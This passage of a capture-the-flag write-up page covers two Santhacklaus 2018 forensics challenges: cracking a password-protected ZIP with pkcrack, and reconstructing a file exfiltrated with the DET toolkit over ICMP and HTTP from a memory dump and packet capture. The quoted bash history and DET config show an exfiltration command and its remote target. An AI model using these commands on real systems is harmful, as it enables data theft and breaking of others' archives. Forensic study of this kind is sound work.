+    26267  2018-12-16 15:51   jcvd-website/images/writing.jpg
+   133773  2018-12-16 15:51   jcvd-website/images/pencil_sharpener.jpg
+     7384  2018-12-16 15:51   jcvd-website/index.html
+        0  2018-12-16 15:51   jcvd-website/fonts/
+    45404  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.ttf
+    18028  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.woff2
+    23424  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.woff
+    20127  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.eot
+   108738  2018-12-16 15:51   jcvd-website/fonts/glyphicons-halflings-regular.svg
+        0  2018-12-16 15:51   jcvd-website/css/
+     6148  2018-12-16 15:51   jcvd-website/css/.DS_Store
+   147430  2018-12-16 15:51   jcvd-website/css/bootstrap.css
+     8335  2018-12-16 15:51   jcvd-website/css/custom.css
+   122540  2018-12-16 15:51   jcvd-website/css/bootstrap.min.css
+---------                     -------
+  1130857                     31 files
+</code></pre>
+
+<p>The archive is password protected, but we can break pkzip encryption with known plaintext attack using <code>pkcrack</code>. I need a clear file and the same file encrypted in the zip archive. I choosed <code>microphone.jpg</code>.</p>
+
+<pre><code class="language-bash">$ cat filescan | grep microphone.jpg    
+          261768 0xffff88003ce0f898 /var/www/a-strong-hero.com/jcvd-website/images/microphone.jpg
+
+$ volatility -f challenge.elf --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88003ce0f898 -O microphone.jpg
+
+$ zip micro.zip microphone.jpg
+
+$ pkcrack-1.2.2/src/pkcrack -C unsplit.zip -c &quot;jcvd-website/images/microphone.jpg&quot; -P micro.zip -p &quot;microphone.jpg&quot; -d bitedepoulet.zip -a
+Done. Left with 96 possible Values. bestOffset is 40412.
+Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
+Probabilistic test succeeded for 11365 bytes.
+Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
+Probabilistic test succeeded for 11365 bytes.
+Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
+Probabilistic test succeeded for 11365 bytes.
+Ta-daaaaa! key0=751f036a, key1=397078fa, key2=d156dfac
+Probabilistic test succeeded for 11365 bytes.
+Decrypting flag.txt (91c644af94249dd314b62b57)... OK!
+Decrypting jcvd-website/js/.DS_Store (2fe6d64c750f20da2d6b7b4e)... OK!
+Decrypting jcvd-website/js/bootstrap.min.js (31beae5a6417af2fcee27b4e)... OK!
+Decrypting jcvd-website/js/jquery-1.11.3.min.js (68cffaef64b77eca810f7b4e)... OK!
+Decrypting jcvd-website/js/bootstrap.js (172450e6004efe284b507b4e)... OK!
+Decrypting jcvd-website/js/custom.js (4038fc0d73419d37a34f7b4e)... OK!
+Decrypting jcvd-website/js/ie10-viewport-bug-workaround.js (71f134fe12dcf4d413c17b4e)... OK!
+Decrypting jcvd-website/js/jquery.easing.min.js (dd66d46318af5411b24b7b4e)... OK!
+Decrypting jcvd-website/.DS_Store (ccc90b8c7a949b1dd0297b4e)... OK!
+Decrypting jcvd-website/images/concert.jpg (2531ab52a4c3f2af90017b4e)... OK!
+Decrypting jcvd-website/images/.DS_Store (cd53bfa34fee99aade507b4e)... OK!
+Decrypting jcvd-website/images/microphone.jpg (e04e73cca1576915c96f7b4e)... OK!
+Decrypting jcvd-website/images/iphone.jpg (7d0e3ddec5bb0eb5d5537b4e)... OK!
+Decrypting jcvd-website/images/header.jpg (558cd122c491a4c95df47b4e)... OK!
+Decrypting jcvd-website/images/writing.jpg (de9b24799ceac1377f317b4e)... OK!
+Decrypting jcvd-website/images/pencil_sharpener.jpg (89cbb73d79aa6c0472607b4e)... OK!
+</code></pre>
+
+<p>The archive is not fully decrypted, there are some glitch. But it&rsquo;s not a problem because <code>flag.txt</code> is properly decrypted! Then you just have to <code>strings</code> the new archive.</p>
+
+<h2 id="flag-39">Flag</h2>
+
+<pre><code class="language-bash">$ strings bitedepoulet.zip | grep IMTLD
+IMTLD{z1p_1s_n0t_alw4y5_s4fe}
+</code></pre>
+
+<h1 id="mission-impossible-2">Mission impossible 2</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Mission&nbsp;impossible&nbsp;<sup>2</sup>&frasl;<sub>2</sub></td>
+<td>Forensic/Crypto/Network</td>
+<td>500</td>
+<td>22</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-40">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_mi2.png" alt="" />
+<em>Fig 1</em>: &ldquo;Mission impossible 2&rdquo; statement</p>
+
+<p><iframe width="560" height="315" src="https://www.youtube.com/embed/NA2UkAcXdL0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</center></p>
+
+<p>(Awesome work again for the video :D)</p>
+
+<h2 id="state-of-the-art-27">State of the art</h2>
+
+<p>We got again a Debian memory dump, fortunately it&rsquo;s the same profile for the <code>Mission impossible 1</code> and this one.</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_banner
+Linux version 3.16.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.57-2 (2018-07-14)
+
+$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_bash
+Pid      Name                 Command Time                   Command
+-------- -------------------- ------------------------------ -------
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   cd DET/
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   nano config.json 
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo pip install -r requirements.txt 
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   cd /opt/
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   ls -alh
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo git clone https://github.com/sensepost/DET
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo python det.py -c config.json -p icmp,http -f flag.zip 
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   rm flag.zip 
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   cp config-sample.json config.json 
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   zip flag.zip flag.jpg -P IMTLD{N0t_Th3_Fl4g}
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   rm flag.jpg 
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   sudo chown -R evil-hacker:evil-hacker /opt/DET/
+    1715 bash                 2018-11-09 22:56:08 UTC+0000   cp -v /media/evil-hacker/DISK_IMG/FOR05/flag.jpg .
+    1715 bash                 2018-11-09 22:56:47 UTC+0000   history
+    1715 bash                 2018-11-09 22:57:12 UTC+0000   cd /opt/DET/
+    1715 bash                 2018-11-09 22:57:48 UTC+0000   find . -type f -print0 | xargs -0 md5sum md5sums.txt
+    1715 bash                 2018-11-09 22:57:57 UTC+0000   find . -type f -print0 | xargs -0 md5sum &gt; md5sums.txt
+</code></pre>
+
+<p>Owh! The user is used DET (Data Exfiltration Toolkit), a little client / server for data exfiltration made by @PaulWebSec: <a href="https://github.com/sensepost/DET">https://github.com/sensepost/DET</a></p>
+
+<p>So, the evil hacker exfiltrates his data through ICMP and HTTP, according to the bash history. Fortunately, it&rsquo;s what we got in the PCAP:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/mi2_1.png" alt="" />
+<em>Fig 2</em>: Base64 data in the PCAP
+</center></p>
+
+<ul>
+<li>red framed shows the ICMP data</li>
+<li>green framed shows the HTTP data</li>
+</ul>
+
+<h2 id="how-det-works">How DET works?</h2>
+
+<p>It uses a configuration file <code>config.json</code>:</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_find_file -L &gt; filelist
+
+$ cat filelist | grep config.json
+          672629 0xffff88003c16ec80 /opt/DET/config.json
+
+$ volatility -f challenge.raw --profile=LinuxMI1_profilex64 linux_find_file -i 0xffff88003c16ec80 -O config.json
+
+$ cat config.json
+{
+    &quot;plugins&quot;: {
+        &quot;http&quot;: {
+            &quot;target&quot;: &quot;192.168.0.29&quot;,
+            &quot;port&quot;: 8080
+        },
+        &quot;google_docs&quot;: {
+            &quot;target&quot;: &quot;SERVER&quot;,
+            &quot;port&quot;: 8080
+        },        
+        &quot;dns&quot;: {
+            &quot;key&quot;: &quot;google.com&quot;,
+            &quot;target&quot;: &quot;192.168.0.29&quot;,
+            &quot;port&quot;: 53
+        },
+        &quot;gmail&quot;: {
+            &quot;username&quot;: &quot;dataexfil@gmail.com&quot;,
+            &quot;password&quot;: &quot;CrazyNicePassword&quot;,
+            &quot;server&quot;: &quot;smtp.gmail.com&quot;,
+            &quot;port&quot;: 587
+        },
+        &quot;tcp&quot;: {
+            &quot;target&quot;: &quot;192.168.0.29&quot;,
+            &quot;port&quot;: 6969
+        },
+        &quot;udp&quot;: {
+            &quot;target&quot;: &quot;192.168.0.29&quot;,
+            &quot;port&quot;: 6969
+        },
+        &quot;twitter&quot;: {
+            &quot;username&quot;: &quot;PaulWebSec&quot;,
+            &quot;CONSUMER_TOKEN&quot;: &quot;XXXXXXXXXXX&quot;,
+            &quot;CONSUMER_SECRET&quot;: &quot;XXXXXXXXXXX&quot;,
+            &quot;ACCESS_TOKEN&quot;: &quot;XXXXXXXXXXX&quot;,
+            &quot;ACCESS_TOKEN_SECRET&quot;: &quot;XXXXXXXXXXX&quot;
+        },
+        &quot;icmp&quot;: {
+            &quot;target&quot;: &quot;192.168.0.29&quot;
+        },
+        &quot;slack&quot;: {
+            &quot;api_token&quot;: &quot;xoxb-XXXXXXXXXXX&quot;,
+            &quot;chan_id&quot;: &quot;XXXXXXXXXXX&quot;,
+            &quot;bot_id&quot;: &quot;&lt;@XXXXXXXXXXX&gt;:&quot;
+        }
+    },
+    &quot;AES_KEY&quot;: &quot;IMTLD{This_is_just_a_key_not_the_flag}&quot;,
+    &quot;max_time_sleep&quot;: 10,
+    &quot;min_time_sleep&quot;: 1,
+    &quot;max_bytes_read&quot;: 400,
+    &quot;min_bytes_read&quot;: 300,
+    &quot;compression&quot;: 1
+}
+</code></pre>
+
+<p>So, now we got those informations:</p>
+
+<ul>
+<li>AES Key: IMTLD{This_is_just_a_key_not_the_flag}</li>
+<li>We know it uses DET compression (zlib)</li>
+</ul>
+
+<h2 id="how-data-are-exfiltrated">How data are exfiltrated?</h2>
+
+<p>This is what it looks like in HTTP packets:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/mi2_2.png" alt="" />
+<em>Fig 3</em>: Base64 data through HTTP
+</center></p>
+
+<p>With a little <code>tshark</code> command I was able to extract all base64:</p>
+
+<pre><code class="language-bash">$ tshark -r challenge.pcapng -Y http -Tfields -e urlencoded-form.value &gt; data_http.b64
+
+$ cat data_http.b64 | base64 -d | less
+z6f9HaX|!|1|!|246760c25e3f659efe1b8299032616c0a6c92ce1d72addcf01183fd535d83abc5ce238d49d9bd255e8be9161ba00ab68a5dc2882c9159d055002085b7c0bb55b5ffe596b9229ac6280acacec248d187b2559fc4e1d8eb2a2711aeaf96616b52c39410d6423f877817cdb8e827086badbf1390331c87e2291c56756f696f4f02bb26d2ccf93c906c91ddebe9a2f68086e679a3c562217646afe79227ef5b9c485ffaef859fe42c35e4627a63c017d39b5e8d11fb32ddce0d88cbbb5a74c0215e3be78de850fa30b0b03cffaa041096810459559864c9f0bc0ac4e214c58ca8b89b73248130f096005a00b555d028d8c8cd7f69e57d6f925c2ea262a3b067d809dfaf8f825e7c4b8e02a54376d5d209a1e15a3866f544a03917a80cc183def3b6fac629a5e6fbdcbcf6cbe0a1713791651fbf6cd1917601b18709e3738bc03c4ba8ce55f13df90ed4603bb1d86de0fa4ab8d36a4ab010477e3270d31439e446d872730
+z6f9HaX|!|5|!|8f7507923c3481c900f9d0c2b84b9517b1b0bf488148a9759bf26205c6471295e591587ae7d11d871bd31080b390d444d972a60eb799d3ea8ac7da599695588c8052a5d14ea1aa93ae6af1d6f76f4d62483a60f1c6e3713d31245f1817699695f1cb44e4b4ce1a6737cab1ac04f17a21d1053be83a6a59bc287ee5a42a7ec6dff033645715ef41e72bcf7495fcf04785c7612bd64def432940f13959c73d9cf79fb364ba6a5a891a713abb58bde1486caf187f9a398078c0744652838059ce0d10b903279692f0513e0f88af96796d85ab2f712866c2d8637a746e0d228bb736384e6c43ef253a0aa7cfba1219ce2393ce57bcf05b53a858858a665bc80d46c51289dcb6e9674c30563d03bbb80221e714349ffadf19afcce37206b8da66ef5f7fb2f3739c64f9699536ff545b73a6d37de627cb
+[...]
+
+$ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.data | tr -d ':' | xxd -r -p | sed 's/ejZmO/\nejZmO/g' &gt; data_icmp.b64
+
+$ cat data_icmp.b64 | base64 -d | less
+z6f9HaX|!|flag.zip|!|REGISTER|!|3682490664d5bf7905397710edb84737
+z6f9HaX|!|0|!|f8e946873b6e3a34035d82b1aadec650edc693c449b064a06bd1c7432e801193b497f998d1265e7e9da7b4ea56d650ae0dfbd717ef4dd1418d2d9b4e68b835f166643a705acd64c60e56add715a064524363bff1152aae8c2b2e82548c7f7f0f69690d18733e42de352ce5bb6fd5b2b696688ad84a80d3862cab8274d4b5a79065f4be827f36cd0271ae6ed1306107437e26bbdfce7fcfe3d0840e03a4bb5b776b5501582240cbaeccc8c6969653973805209cdcdc2e2c70325cabf8ecc8ad7f192b8b0d7c0bde5489a10e23175a4e593641862d625145d3a9f1b8de163325c534bc6c303109f63b2bd7ea5bdd22cefd8e1415b8374811c5d656eac67b924e2f7f170821b77361513ad6d9e0972641f83a8cac5776e09320b657dd0c1d6449c19c032d77d92c80fa991e9eefc585aab8e7a5feb56ea7
+z6f9HaX|!|2|!|3de71e0826b4f3c85d0b17931d2effd04913e6320e30e73f5cc652c9e3a7f3bb4bbce092648283324298d594aae4f8bfa73732b492e479c4d1d642310ce0a3344186f9bc21ac86833010ef2bd6b2e31b9251690902b660448f88b9dc48963270d603942fc5910715d0d4f18224316f571116e05be4f0404f468ef856eab4ad6f38683aa0b935d0bc9933231d3262b54aca672be1fd2cb0d59fc49c807de24dc582501396dd54b67efe2fe7687b0c62de63de5c278200c3288269729cf7428fc0b48298699a808a141fc3bee1ba01a90c51faed07c3d35149c5988f9301e2e70a9d955b1545581522f90f4a2e9c88cf8e502bca12128ba0cb77409220c259035bc3ca1727e017713abb08b9491675f20bad831ba685edaefa572ca8da0c56bfb3615048a0764305dc219936237f5764cdc1031d024591c66ef92d38bbe9a73614411e27z6f9HaX|!|3|!|8037dbd29c0393e519050999210fe5ce63880109a09bf879b09b8b9f952d438d51d8b54
+[...]
+</code></pre>
+
+<p>Ok, the data follow the following pattern:</p>
+
+<blockquote>
+<p>ID|!|number|!|AES encrypted data</p>
+</blockquote>
+
+<h2 id="scripting-and-decryption-time">Scripting and decryption time</h2>
+
+<p>According the previous scenarios, I just have to sort all packet by number, extract encrypted data and decrypt / decompress it.</p>
+
+<p>Here is my quick and dirty script:</p>
+
+<pre><code class="language-python">#!/usr/bin/python2
+
+from base64 import b64decode
+from Crypto.Cipher import AES
+import hashlib
+from zlib import compress, decompress
+
+# Function from DET Github
+def aes_decrypt(message,key):
+    iv = message[:AES.block_size]
+    message = message[AES.block_size:]
+    aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
+    message = aes.decrypt(message)
+    unpad = lambda s: s[:-ord(s[len(s)-1:])]
+    return unpad(message)
+
+tmp = {}
+
+f = open('data_http.b64','r')
+data_http = f.read()
+f.close()
+
+data_http = filter(bool, data_http.split('\n'))
+
+clear_http = []
+
+for i in data_http:
+  clear_http.append(b64decode(i))
+
+# Dictionnary creation from http data
+for i in range(0,len(clear_http)):
+  tmp[int(clear_http[i].split('|')[2])] = clear_http[i].split('|')[4]
+
+g = open('data_icmp.b64','r')
+data_icmp = g.read().split('\n')
+g.close()
+
+clear_icmp = []
+for i in data_icmp:
+  clear_icmp.append(b64decode(i))
+
+clear_icmp.pop(0)
+clear_icmp.pop(0)
+
+# Dictionnary append with icmp data
+for j in range(0,len(clear_icmp)):
+  tmp[int(clear_icmp[j].split('|')[2])] = clear_icmp[j].split('|')[4]
+
+final = &quot;&quot;
+
+for i in range(0,len(tmp)):
+  final += tmp[i]
+
+final = final[:-4]
+flag = aes_decrypt(final.decode('hex'),&quot;IMTLD{This_is_just_a_key_not_the_flag}&quot;)
+flag = decompress(flag) # zlib decompression
+
+h = open('flag.dat','wb')
+h.write(flag)
+h.close()
+print &quot;[+] flag.dat written :)&quot;
+</code></pre>
+
+<pre><code class="language-bash">$ ./decrypt.py 
+[+] flag.dat written :)
+
+$ file flag.dat 
+flag.dat: Zip archive data, at least v2.0 to extract
+
+$ unzip -l flag.dat                                                
+Archive:  flag.dat
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+    25369  2018-11-09 22:34   flag.jpg
+---------                     -------
+    25369                     1 file
+
+$ unzip flag.dat
+Archive:  flag.dat
+[flag.dat] flag.jpg password: IMTLD{N0t_Th3_Fl4g}
+  inflating: flag.jpg
+
+$ file flag.jpg 
+flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 706x396, components 1
+</code></pre>
+
+<h2 id="flag-40">Flag</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/mi2_3.jpg" alt="" />
+<em>Fig 4</em>: Flag
+</center></p>
+
+	</div>
+</article>
+
+		</div>
+		
+	
+<script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js" integrity="sha256-l1iMQ6f0+8aFBzSNRxgklLlYMqu5S4b/LpaST2s+gog= sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy sha512-3dlGoFoY39YEcetqKPULIqryjeClQkr2KXshhYxFXNZAgRFZElUW9UQmYkmQE1bvB8tssj3uSKDzsj8rA04Meg==" crossorigin="anonymous"></script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw= sha384-ZeLYJ2PNSQjvogWP559CDAf02Qb8FE5OyQicqtz/+UhZutbrwyr87Be7NPH/RgyC sha512-ExaEi+x+Zqq50MIBraxsK23lQQJZd8Q7ZDlwJsxQwsWlO8XvRouQev9ZWaFxCKdTvrgb2fmf2pglwGp61/7qZA==" crossorigin="anonymous"></script>
+	
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+	
+
+
+	<script>
+    (function() {
+      var toc = document.getElementById('TableOfContents');
+      if (!toc) return;
+      do {
+        var li, ul = toc.querySelector('ul');
+        if (ul.childElementCount !== 1) break;
+        li = ul.firstElementChild;
+        if (li.tagName !== 'LI') break;
+        
+        ul.outerHTML = li.innerHTML;
+      } while (toc.childElementCount >= 1);
+    })();
+  </script>
+
+	</body>
+</html>
